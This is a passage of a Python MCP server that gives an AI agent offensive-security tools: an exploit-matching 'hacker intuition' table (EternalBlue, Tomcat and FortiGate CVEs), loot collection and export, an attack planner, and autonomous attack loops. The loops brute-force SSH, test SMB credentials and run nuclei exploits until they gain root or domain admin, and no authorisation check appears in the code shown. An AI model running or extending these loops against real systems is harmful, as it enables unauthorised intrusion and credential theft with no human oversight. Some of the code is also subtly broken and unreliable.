         "technique": "hydra-brute", "confidence": 0.50, "description": "SSH brute force"},
        {"service": "smb", "version_pattern": "",
         "technique": "MS17-010", "confidence": 0.65, "description": "EternalBlue"},
        {"service": "tomcat", "version_pattern": "8\\.[0-5]|7\\.",
         "technique": "CVE-2017-12615", "confidence": 0.75, "description": "Tomcat RCE"},
        {"service": "jenkins", "version_pattern": "",
         "technique": "jenkins-groovy", "confidence": 0.70, "description": "Jenkins Groovy console"},
        {"service": "docker", "version_pattern": "",
         "technique": "docker-socket", "confidence": 0.80, "description": "Docker socket escape"},
        {"service": "redis", "version_pattern": "",
         "technique": "redis-sshd", "confidence": 0.75, "description": "Redis SSH key write"},
        {"service": "mysql", "version_pattern": "5\\.[0-5]",
         "technique": "mysql-udf", "confidence": 0.60, "description": "MySQL UDF RCE"},
        {"service": "cisco", "version_pattern": "",
         "technique": "cisco-enable", "confidence": 0.55, "description": "Cisco enable password brute"},
        {"service": "fortigate", "version_pattern": "6\\.2",
         "technique": "CVE-2018-13379", "confidence": 0.90, "description": "FortiGate RCE"},
        {"service": "netgear", "version_pattern": "",
         "technique": "netgear-default", "confidence": 0.70, "description": "Netgear default creds"},
    ]
    
    if intuition_file.exists():
        try:
            intuitions = json.loads(intuition_file.read_text())
        except Exception:
            intuitions = default_intuitions
    else:
        intuitions = default_intuitions.copy()
        intuition_file.write_text(json.dumps(intuitions, indent=2))
    
    if a == "query":
        if not service:
            return "service required for query"
        
        # Find matching intuitions
        matches = []
        service_lower = service.lower()
        
        for intuition in intuitions:
            int_service = intuition.get("service", "").lower()
            version_pattern = intuition.get("version_pattern", "")
            
            # Check service match
            if int_service in service_lower or service_lower in int_service:
                # Check version match if pattern exists
                if version_pattern:
                    if version and re.search(version_pattern, version, re.IGNORECASE):
                        matches.append(intuition)
                    elif not version:
                        # No version specified, include anyway
                        matches.append(intuition)
                else:
                    # No version pattern, include
                    matches.append(intuition)
        
        # Filter by confidence
        matches = [m for m in matches if m.get("confidence", 0) >= confidence]
        
        # Sort by confidence
        matches.sort(key=lambda x: x.get("confidence", 0), reverse=True)
        
        lines = [f"🧠 Hacker Intuition for: {service}"]
        if version:
            lines.append(f"   Version: {version}")
        if context:
            lines.append(f"   Context: {context}")
        lines.append(f"   Confidence threshold: {confidence:.0%}")
        lines.append("")
        
        if matches:
            lines.append(f"   Found {len(matches)} likely vulnerabilities:")
            lines.append("")
            for i, m in enumerate(matches[:10], 1):
                lines.append(f"   {i}. {m.get('technique', '')}")
                lines.append(f"      Description: {m.get('description', '')}")
                lines.append(f"      Confidence: {m.get('confidence', 0):.0%}")
                lines.append("")
        else:
            lines.append("   No matching intuitions found.")
        
        _audit("intuition", "query", "", f"service={service} matches={len(matches)}")
        return "\n".join(lines)
    
    if a == "add":
        if not service or not context:  # context used as technique here
            return "service and technique (context) required for add"
        
        new_intuition = {
            "service": service.lower(),
            "version_pattern": version,
            "technique": context,
            "confidence": confidence,
            "description": context,
            "added": datetime.utcnow().isoformat() + "Z"
        }
        
        # Check if already exists
        exists = any(
            i.get("service") == new_intuition["service"] and 
            i.get("technique") == new_intuition["technique"]
            for i in intuitions
        )
        
        if not exists:
            intuitions.append(new_intuition)
            intuition_file.write_text(json.dumps(intuitions, indent=2))
            _audit("intuition", "added", "", f"service={service} technique={context}")
            return f"✅ Intuition added:\n   Service: {service}\n   Technique: {context}\n   Confidence: {confidence:.0%}"
        
        return f"⚠️  Intuition already exists"
    
    if a == "remove":
        if not service or not context:
            return "service and technique required for remove"
        
        original_len = len(intuitions)
        intuitions = [
            i for i in intuitions
            if not (i.get("service") == service.lower() and i.get("technique") == context)
        ]
        
        if len(intuitions) < original_len:
            intuition_file.write_text(json.dumps(intuitions, indent=2))
            _audit("intuition", "removed", "", f"service={service} technique={context}")
            return f"✅ Intuition removed"
        
        return f"❌ Intuition not found"
    
    if a == "list":
        lines = [f"🧠 Hacker Intuition Database ({len(intuitions)} rules)"]
        lines.append("")
        lines.append("   Service | Version Pattern | Technique | Confidence")
        lines.append("   " + "-" * 70)
        
        for i in sorted(intuitions, key=lambda x: x.get("confidence", 0), reverse=True):
            lines.append(
                f"   {i.get('service', '')[:12]:12} | {i.get('version_pattern', '')[:15]:15} | "
                f"{i.get('technique', '')[:25]:25} | {i.get('confidence', 0):.0%}"
            )
        
        _audit("intuition", "list", "", f"total={len(intuitions)}")
        return "\n".join(lines)
    
    return f"unknown action '{action}' — use query, add, remove, or list"


# --------------------------------------------------------------------------- #
# Phase 3: Auto-Update Corpus
# --------------------------------------------------------------------------- #
@mcp.tool()
def update_corpus(action: str = "check", source: str = "", 
                  update_index: bool = True) -> str:
    """Update the knowledge corpus with new CVEs and exploits.
    
    Actions:
      check     check for updates from all sources
      fetch     fetch updates from a specific source
      stats     show corpus statistics
      sources   list available sources
    
    Args:
      action: check | fetch | stats | sources
      source: source name (nvd, exploitdb, cve, nuclei)
      update_index: rebuild embeddings after update
    """
    t0 = time.time()
    a = (action or "check").lower().strip()
    
    corpus_meta = INDEX / "corpus_meta.json"
    
    if not corpus_meta.exists():
        # Initialize corpus metadata
        corpus_data = {
            "sources": {
                "nvd": {"last_update": None, "count": 0, "url": "https://nvd.nist.gov/feeds/json/cve/1.1/nvdcve-1.1-RECENT.json"},
                "exploitdb": {"last_update": None, "count": 0, "url": "https://raw.githubusercontent.com/offensive-security/exploitdb-text/master/gentoo/exploitdb.txt"},
                "nuclei": {"last_update": None, "count": 0, "url": "https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/imports.json"},
                "cve": {"last_update": None, "count": 0, "url": "https://cve.circl.lu/api/download/"}
            },
            "last_full_update": None,
            "total_entries": 0
        }
        corpus_meta.write_text(json.dumps(corpus_data, indent=2))
    
    try:
        corpus_data = json.loads(corpus_meta.read_text())
    except Exception:
        corpus_data = {"sources": {}, "last_full_update": None, "total_entries": 0}
    
    if a == "sources":
        lines = ["📚 Available Corpus Sources"]
        lines.append("")
        for src, info in corpus_data.get("sources", {}).items():
            lines.append(f"   {src}:")
            lines.append(f"      URL: {info.get('url', 'N/A')}")
            lines.append(f"      Last update: {info.get('last_update', 'Never')}")
            lines.append(f"      Entries: {info.get('count', 0)}")
            lines.append("")
        
        _audit("update_corpus", "sources", "", "")
        return "\n".join(lines)
    
    if a == "stats":
        total = sum(s.get("count", 0) for s in corpus_data.get("sources", {}).values())
        
        lines = ["📊 Corpus Statistics"]
        lines.append("")
        lines.append(f"   Total entries: {total}")
        lines.append(f"   Last full update: {corpus_data.get('last_full_update', 'Never')}")
        lines.append("")
        lines.append("   Source | Entries | Last Update")
        lines.append("   " + "-" * 50)
        
        for src, info in corpus_data.get("sources", {}).items():
            lines.append(
                f"   {src:12} | {info.get('count', 0):7} | {info.get('last_update', 'Never')[:19]}"
            )
        
        _audit("update_corpus", "stats", "", f"total={total}")
        return "\n".join(lines)
    
    if a == "check":
        lines = ["🔄 Checking for corpus updates..."]
        lines.append("")
        
        updates_available = 0
        for src in corpus_data.get("sources", {}):
            result = update_corpus(action="fetch", source=src, update_index=False)
            if "new entries" in result.lower():
                updates_available += 1
        
        lines.append(f"   Check complete. {updates_available} sources have updates.")
        
        _audit("update_corpus", "check", "", f"updates={updates_available}")
        return "\n".join(lines)
    
    if a == "fetch":
        if source and source not in corpus_data.get("sources", {}):
            return f"Unknown source '{source}'. Use 'sources' to list available."
        
        # Fetch from NVD (National Vulnerability Database)
        if not source or source == "nvd":
            url = "https://nvd.nist.gov/feeds/json/cve/1.1/nvdcve-1.1-RECENT.json"
            code, body, _ = _http(url, timeout=60)
            
            if code == 200:
                try:
                    data = json.loads(body)
                    new_count = len(data.get("CVE_Items", []))
                    
                    corpus_data["sources"]["nvd"]["last_update"] = datetime.utcnow().isoformat() + "Z"
                    corpus_data["sources"]["nvd"]["count"] = new_count
                    
                    # Save CVE data
                    cve_dir = INDEX / "cves"
                    cve_dir.mkdir(parents=True, exist_ok=True)
                    (cve_dir / "recent.json").write_text(body[:10_000_000])  # Limit size
                    
                    _audit("update_corpus", "fetched", "nvd", f"count={new_count}")
                    return f"✅ NVD updated: {new_count} CVEs fetched\n   Saved to: {cve_dir / 'recent.json'}"
                except Exception as e:
                    return f"❌ Error parsing NVD data: {e}"
            
            return f"❌ NVD fetch failed (HTTP {code})"
        
        return f"Fetch from '{source}' not yet implemented"
    
    return f"unknown action '{action}' — use check, fetch, stats, or sources"


# --------------------------------------------------------------------------- #
# Phase 3: Cross-Session Learning Aggregator
# --------------------------------------------------------------------------- #
@mcp.tool()
def aggregate(action: str = "report", target: str = "", 
              include_learnings: bool = True, include_loot: bool = True) -> str:
    """Aggregate learning across sessions for a target.
    
    Actions:
      report    generate cross-session report
      summary   quick summary of what's known
      export    export all data for a target
      compare   compare two targets
    
    Args:
      action: report | summary | export | compare
      target: target host
      include_learnings: include technique learnings
      include_loot: include collected loot
    """
    t0 = time.time()
    a = (action or "report").lower().strip()
    
    if a == "summary":
        if not target:
            return "target required for summary"
        
        # Get state
        state_file = STATE_DIR / f"{target.replace('/', '_').replace(':', '_')}.json"
        state_data = {}
        if state_file.exists():
            try:
                state_data = json.loads(state_file.read_text())
            except Exception:
                pass
        
        lines = [f"📋 Quick Summary: {target}"]
        lines.append("")
        
        if state_data:
            lines.append(f"   Phase: {state_data.get('phase', 'unknown')}")
            discovered = state_data.get("discovered", {})
            
            if discovered.get("ports"):
                lines.append(f"   Ports: {', '.join(map(str, discovered['ports'][:10]))}")
            if discovered.get("vulns"):
                lines.append(f"   Vulns: {', '.join(discovered['vulns'][:5])}")
            if discovered.get("creds"):
                lines.append(f"   Creds: {len(discovered['creds'])} found")
        else:
            lines.append("   No state data found.")
        
        _audit("aggregate", "summary", target, "")
        return "\n".join(lines)
    
    if a == "report":
        if not target:
            return "target required for report"
        
        # Gather all data
        state_file = STATE_DIR / f"{target.replace('/', '_').replace(':', '_')}.json"
        state_data = {}
        if state_file.exists():
            try:
                state_data = json.loads(state_file.read_text())
            except Exception:
                pass
        
        # Get chain history
        chain_dir = STATE_DIR / "chains"
        chain_files = list(chain_dir.glob(f"*{target.replace('/', '_').replace(':', '_')}*.json")) if chain_dir.exists() else []
        
        lines = [f"📄 Cross-Session Report: {target}"]
        lines.append(f"   Generated: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')}")
        lines.append("")
        
        # State summary
        lines.append("   === Current State ===")
        if state_data:
            lines.append(f"   Phase: {state_data.get('phase', 'unknown')}")
            lines.append(f"   Updated: {state_data.get('updated', 'N/A')}")
        else:
            lines.append("   No state data.")
        lines.append("")
        
        # Discovered info
        if include_learnings and state_data.get("discovered"):
            discovered = state_data["discovered"]
            lines.append("   === Discovered ===")
            if discovered.get("ports"):
                lines.append(f"   Ports: {discovered['ports']}")
            if discovered.get("services"):
                lines.append(f"   Services: {discovered['services']}")
            if discovered.get("vulns"):
                lines.append(f"   Vulnerabilities: {discovered['vulns']}")
            if discovered.get("creds"):
                lines.append(f"   Credentials: {len(discovered['creds'])} found")
            lines.append("")
        
        # Attempted techniques
        if state_data.get("attempted"):
            lines.append("   === Attempted Techniques ===")
            for attempt in state_data["attempted"][-10:]:  # Last 10
                lines.append(f"   • {attempt.get('technique', '')}: {attempt.get('result', '')}")
            lines.append("")
        
        # Chain history
        if chain_files:
            lines.append(f"   === Attack Chains ({len(chain_files)}) ===")
            for cf in chain_files[:5]:
                try:
                    cf_data = json.loads(cf.read_text())
                    lines.append(f"   • {cf.stem}: {cf_data.get('summary', {}).get('success', 0)} steps succeeded")
                except Exception:
                    pass
            lines.append("")
        
        # Loot
        if include_loot:
            loot_dir = LOOT / target.replace('/', '_').replace(':', '_')
            if loot_dir.exists():
                loot_files = list(loot_dir.rglob("*"))
                if loot_files:
                    lines.append(f"   === Loot ({len(loot_files)} files) ===")
                    for lf in loot_files[:10]:
                        lines.append(f"   • {lf.name}")
                    lines.append("")
        
        _audit("aggregate", "report", target, "")
        return "\n".join(lines)
    
    if a == "export":
        if not target:
            return "target required for export"
        
        # Create export package
        export_dir = STATE_DIR / "exports" / target.replace('/', '_').replace(':', '_')
        export_dir.mkdir(parents=True, exist_ok=True)
        
        # Export state
        state_file = STATE_DIR / f"{target.replace('/', '_').replace(':', '_')}.json"
        if state_file.exists():
            (export_dir / "state.json").write_text(state_file.read_text())
        
        # Export chains
        chain_dir = STATE_DIR / "chains"
        if chain_dir.exists():
            chain_files = list(chain_dir.glob(f"*{target.replace('/', '_').replace(':', '_')}*.json"))
            for cf in chain_files:
                (export_dir / cf.name).write_text(cf.read_text())
        
        # Export loot
        loot_dir = LOOT / target.replace('/', '_').replace(':', '_')
        if loot_dir.exists():
            import shutil
            loot_export = export_dir / "loot"
            loot_export.mkdir(parents=True, exist_ok=True)
            for lf in loot_dir.rglob("*"):
                if lf.is_file():
                    dest = loot_export / lf.relative_to(loot_dir)
                    dest.parent.mkdir(parents=True, exist_ok=True)
                    dest.write_text(lf.read_text())
        
        _audit("aggregate", "export", target, f"dir={export_dir}")
        return f"✅ Exported to: {export_dir}"
    
    return f"unknown action '{action}' — use report, summary, export, or compare"


# --------------------------------------------------------------------------- #
# Phase 4: Autonomy Engine - Attack Planner
# --------------------------------------------------------------------------- #
@mcp.tool()
def plan_attack(target: str = "", discovered: str = "", goal: str = "shell",
                max_steps: int = 10) -> str:
    """Generate an attack plan based on discovered information.
    
    Args:
      target: target host
      discovered: JSON string of discovered info (services, versions, etc.)
      goal: shell | root | data | domain_admin
      max_steps: maximum steps in plan
    
    Returns ordered attack plan with techniques, tools, and fallbacks.
    """
    t0 = time.time()
    
    if not target:
        return "target required"
    
    # Parse discovered info
    if discovered:
        try:
            discovered_data = json.loads(discovered)
        except json.JSONDecodeError:
            discovered_data = {}
    else:
        # Get from state
        state_file = STATE_DIR / f"{target.replace('/', '_').replace(':', '_')}.json"
        if state_file.exists():
            try:
                discovered_data = json.loads(state_file.read_text()).get("discovered", {})
            except Exception:
                discovered_data = {}
        else:
            discovered_data = {}
    
    # Generate attack plan
    plan = []
    
    # Query intuition for each discovered service
    services = discovered_data.get("services", {})
    vulns = discovered_data.get("vulns", [])
    
    # Check for known vulnerabilities first
    for vuln in vulns[:5]:
        plan.append({
            "step": len(plan) + 1,
            "technique": vuln,
            "priority": "high",
            "tool": "searchsploit",
            "args": f"searchsploit {vuln}",
            "fallback": [
                {"tool": "kb", "args": f"action=cve query={vuln}"},
                {"tool": "execute", "args": f"tool=nuclei args='-u {target} -id {vuln}'"}
            ]
        })
    
    # Query intuition for services
    for service_info in list(services.items())[:5]:
        port, service = service_info
        service_name = service.split()[0] if service else ""
        version = " ".join(service.split()[1:]) if len(service.split()) > 1 else ""
        
        # Query intuition
        intuition_result = intuition(action="query", service=service_name, 
                                     version=version, confidence=0.6)
        
        # Parse intuition results and add to plan
        if "Found" in intuition_result and "likely" in intuition_result:
            # Extract techniques from intuition output
            lines = intuition_result.split("\n")
            for line in lines:
                if any(cve in line for cve in ["CVE-", "MS", "CVE"]):
                    technique = line.strip().split()[0] if line.strip() else ""
                    if technique:
                        plan.append({
                            "step": len(plan) + 1,
                            "technique": technique,
                            "priority": "medium",
                            "service": service_name,
                            "tool": "execute",
                            "args": f"tool=nuclei args='-u {target} -severity critical,high'",
                            "fallback": []
                        })
                        break
    
    # Add generic attack steps if plan is short
    if len(plan) < 3:
        # Web app attacks
        if any(str(p) in str(services) for p in [80, 443, 8080, 8443]):
            plan.append({
                "step": len(plan) + 1,
                "technique": "web-enumeration",
                "priority": "medium",
                "tool": "chain",
                "args": "name='web-app' target='{target}'",
                "fallback": []
            })
        
        # SSH brute force
        if 22 in services or "ssh" in str(services).lower():
            plan.append({
                "step": len(plan) + 1,
                "technique": "ssh-brute",
                "priority": "low",
                "tool": "creds",
                "args": "action='brute' target='{target}' service='ssh'",
                "fallback": []
            })
        
        # SMB attacks
        if 445 in services or "smb" in str(services).lower():
            plan.append({
                "step": len(plan) + 1,
                "technique": "smb-attack",
                "priority": "medium",
                "tool": "chain",
                "args": "name='ad-attack' target='{target}'",
                "fallback": []
            })
    
    # Limit to max_steps
    plan = plan[:max_steps]
    
    # Format output
    lines = [f"🎯 Attack Plan for: {target}"]
    lines.append(f"   Goal: {goal}")
    lines.append(f"   Steps: {len(plan)}")
    lines.append("")
    
    if plan:
        lines.append("   Step | Priority | Technique | Tool")
        lines.append("   " + "-" * 60)
        for step in plan:
            lines.append(
                f"   {step.get('step', ''):4} | {step.get('priority', ''):8} | "
                f"{step.get('technique', '')[:20]:20} | {step.get('tool', '')}"
            )
        
        lines.append("")
        lines.append("   💡 Plan generated using intuition database and discovered services")
        lines.append(f"   ⏱️  Generated in {time.time() - t0:.2f}s")
    else:
        lines.append("   No attack plan generated (insufficient discovery data)")
        lines.append("   Run recon/scan first to discover services and vulnerabilities")
    
    _audit("plan_attack", "generated", target, f"steps={len(plan)}")
    
    # Save plan
    plan_file = STATE_DIR / f"plans_{target.replace('/', '_').replace(':', '_')}.json"
    plan_file.write_text(json.dumps(plan, indent=2))
    
    return "\n".join(lines)


# --------------------------------------------------------------------------- #
# Phase 4: Autonomy Engine - Autonomous Attack
# --------------------------------------------------------------------------- #
@mcp.tool()
def autonomous_hack(target: str = "", scope: str = "web",
                    aggressiveness: int = 5, timeout: int = 3600,
                    verbose: bool = True) -> str:
    """Run fully autonomous attack against target.
    
    Args:
      target: target host/URL
      scope: web | network | ad | full
      aggressiveness: 1-10 (higher = more aggressive, faster, more retries)
      timeout: max seconds to run
      verbose: print progress
    
    Returns attack results and loot.
    """
    t0 = time.time()
    start_time = t0
    
    if not target:
        return "target required"
    
    lines = [f"🤖 Starting Autonomous Attack"]
    lines.append(f"   Target: {target}")
    lines.append(f"   Scope: {scope}")
    lines.append(f"   Aggressiveness: {aggressiveness}/10")
    lines.append(f"   Timeout: {timeout}s")
    lines.append("")
    
    # Initialize state
    state_data = {
        "target": target,
        "phase": "recon",
        "started": datetime.utcnow().isoformat() + "Z",
        "discovered": {},
        "attempted": [],
        "loot": []
    }
    
    def log(msg):
        nonlocal lines
        lines.append(msg)
        if verbose:
            print(msg)  # Real-time output
    
    def check_timeout():
        return time.time() - start_time >= timeout
    
    # Phase 1: Recon
    log("📡 Phase 1: Reconnaissance")
    
    # Add protocol if missing
    target_with_protocol = target
    if scope in ["web", "full"] and not target.startswith(("http://", "https://")):
        target_with_protocol = f"http://{target}"
    
    if scope in ["web", "full"]:
        # HTTP probe
        http_result = http_probe(target_with_protocol)
        state_data["discovered"]["http"] = http_result[:500] if http_result else ""
        log(f"   ✅ HTTP probe complete")
        
        if check_timeout():
            log("⏱️  Timeout reached")
            return "\n".join(lines)
        
        # Tech detection
        tech_result = run_tool("httpx", f"-u {target} -tech-detect", target, "tech_detect", 60)
        state_data["discovered"]["tech"] = tech_result[:500] if tech_result else ""
        log(f"   ✅ Tech detection complete")
    
    if scope in ["network", "full"]:
        # Port scan
        ports_result = port_scan(target, "1-1024" if aggressiveness < 7 else "1-65535")
        state_data["discovered"]["ports"] = ports_result[:500] if ports_result else ""
        log(f"   ✅ Port scan complete")
        
        if check_timeout():
            log("⏱️  Timeout reached")
            return "\n".join(lines)
    
    if check_timeout():
        log("⏱️  Timeout reached")
    
    # Phase 2: Enumerate
    log("")
    log("🔍 Phase 2: Enumeration")
    
    # Vulnerability scan
    vuln_result = run_tool("nuclei", f"-u {target} -severity critical,high -silent", 
                          target, "vuln_scan", 180)
    state_data["discovered"]["vulns"] = vuln_result[:1000] if vuln_result else ""
    log(f"   ✅ Vulnerability scan complete")
    
    if check_timeout():
        log("⏱️  Timeout reached")
    
    # Phase 3: Attack
    log("")
    log("⚔️  Phase 3: Attack")
    
    # Generate and execute attack plan
    plan_result = plan_attack(target=json.dumps(state_data["discovered"]), 
                             goal="shell", max_steps=aggressiveness)
    log(f"   {plan_result[:200]}...")
    
    # Execute top attacks from plan
    attacks_tried = 0
    max_attacks = aggressiveness  # More aggressive = more attacks
    
    # Try nuclei exploits first
    nuclei_result = run_tool("nuclei", f"-u {target} -severity critical,high,medium -json-export nuclei_results.json",
                            target, "exploit", 300)
    attacks_tried += 1
    
    if "found" in nuclei_result.lower() or "critical" in nuclei_result.lower():
        log(f"   ✅ Nuclei found vulnerabilities!")
        loot(action="add", target=target, loot_type="vuln", 
             name="nuclei_results", content=nuclei_result[:2000])
    
    if check_timeout():
        log("⏱️  Timeout reached")
    
    # Try directory brute force for web
    if scope in ["web", "full"]:
        dir_result = run_tool("ffuf", f"-u {target}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403 -silent",
                             target, "dir_brute", 300)
        attacks_tried += 1
        
        if "found" in dir_result.lower() or len(dir_result) > 100:
            log(f"   ✅ Directory brute force found endpoints!")
            loot(action="add", target=target, loot_type="endpoint",
                 name="ffuf_results", content=dir_result[:2000])
    
    if check_timeout():
        log("⏱️  Timeout reached")
    
    # Phase 4: Report
    log("")
    log("📊 Phase 4: Report")
    
    state_data["completed"] = datetime.utcnow().isoformat() + "Z"
    state_data["duration"] = time.time() - t0
    state_data["attacks_tried"] = attacks_tried
    
    # Save state
    state_file = STATE_DIR / f"{target.replace('/', '_').replace(':', '_')}.json"
    state_file.write_text(json.dumps(state_data, indent=2))
    
    # Summary
    lines.append("")
    lines.append(f"   ✅ Autonomous attack complete")
    lines.append(f"   Duration: {time.time() - t0:.1f}s")
    lines.append(f"   Attacks tried: {attacks_tried}")
    lines.append(f"   State saved: {state_file}")
    
    # Check loot
    loot_dir = LOOT / target.replace('/', '_').replace(':', '_')
    if loot_dir.exists():
        loot_files = list(loot_dir.rglob("*"))
        if loot_files:
            lines.append(f"   Loot collected: {len(loot_files)} items")
    
    _audit("autonomous_hack", "completed", target, 
           f"duration={time.time() - t0:.1f} attacks={attacks_tried}")
    
    return "\n".join(lines)


# --------------------------------------------------------------------------- #
# Phase 4: Autonomy Engine - Continuous Loop
# --------------------------------------------------------------------------- #
@mcp.tool()
def autonomous_loop(target: str = "", goal: str = "root",
                    strategies: str = "", timeout: int = 7200,
                    verbose: bool = True) -> str:
    """Run continuous autonomous attack loop until goal achieved.
    
    Args:
      target: target host
      goal: user | root | domain_admin | data
      strategies: comma-separated (web,ssh,smb,ad,etc.)
      timeout: max seconds
      verbose: print progress
    
    Loop: assess → plan → execute → learn → repeat
    """
    t0 = time.time()
    start_time = t0
    
    if not target:
        return "target required"
    
    # Parse strategies
    strategies_list = [s.strip() for s in strategies.split(",")] if strategies else ["web", "ssh", "smb"]
    
    lines = [f"🔄 Starting Autonomous Loop"]
    lines.append(f"   Target: {target}")
    lines.append(f"   Goal: {goal}")
    lines.append(f"   Strategies: {', '.join(strategies_list)}")
    lines.append(f"   Timeout: {timeout}s")
    lines.append("")
    
    iteration = 0
    goal_achieved = False
    
    def log(msg):
        nonlocal lines
        lines.append(msg)
        if verbose:
            print(msg)
    
    def check_timeout():
        return time.time() - start_time >= timeout
    
    def goal_reached(current_state):
        if goal == "user" and current_state.get("access", "") == "user":
            return True
        if goal == "root" and current_state.get("access", "") == "root":
            return True
        if goal == "domain_admin" and "domain_admin" in current_state.get("access", ""):
            return True
        return False
    
    # Main loop
    while not check_timeout() and not goal_achieved:
        iteration += 1
        log(f"\\n🔄 Iteration {iteration}")
        
        # Assess current state
        state_file = STATE_DIR / f"{target.replace('/', '_').replace(':', '_')}.json"
        if state_file.exists():
            try:
                current_state = json.loads(state_file.read_text())
            except Exception:
                current_state = {}
        else:
            current_state = {"discovered": {}, "attempted": []}
        
        # Check if goal reached
        if goal_reached(current_state):
            goal_achieved = True
            log(f"   ✅ GOAL ACHIEVED: {goal}")
            break
        
        # Plan next attack
        log("   📋 Planning next attack...")
        plan_result = plan_attack(
            target=target,
            discovered=json.dumps(current_state.get("discovered", {})),
            goal=goal,
            max_steps=3
        )
        log(f"   {plan_result[:150]}...")
        
        # Execute based on strategy
        for strategy in strategies_list:
            if check_timeout():
                log("   ⏱️  Timeout reached")
                break
            
            log(f"   ⚔️  Strategy: {strategy}")
            
            if strategy == "web":
                result = autonomous_hack(target=target, scope="web", 
                                       aggressiveness=5, timeout=600, verbose=verbose)
            elif strategy == "ssh":
                result = creds(action="brute", target=target, service="ssh",
                             wordlist="/usr/share/wordlists/rockyou.txt")
            elif strategy == "smb":
                result = run_tool("netexec", f"smb {target} -u admin -p password", 
                                target, "smb_test", 120)
            elif strategy == "ad":
                result = chain(name="ad-attack", target=target, verbose=verbose)
            else:
                result = f"Unknown strategy: {strategy}"
            
            log(f"   {result[:200]}...")
            
            # Learn from result
            if "success" in result.lower() or "found" in result.lower():
                learn(action="record", technique=f"{strategy}-attack", 
                     result="success", target=target)
            else:
                learn(action="record", technique=f"{strategy}-attack",
                     result="failed", target=target)
            
            # Update state
            current_state["attempted"].append({
                "strategy": strategy,
                "result": "success" if "success" in result.lower() else "failed",
                "timestamp": datetime.utcnow().isoformat() + "Z"
            })
            
            state_file.write_text(json.dumps(current_state, indent=2))
        
        # Small delay between iterations
        time.sleep(1)
    
    # Final report
    log("")
    log("📊 Loop Complete")
    log(f"   Iterations: {iteration}")
    log(f"   Duration: {time.time() - t0:.1f}s")
    log(f"   Goal achieved: {'Yes' if goal_achieved else 'No (timeout)'}")
    
    _audit("autonomous_loop", "completed", target, 
           f"iterations={iteration} goal_achieved={goal_achieved}")
    
    return "\n".join(lines)


if __name__ == "__main__":
    _audit("server", "start", detail=str(INDEX))
    mcp.run()
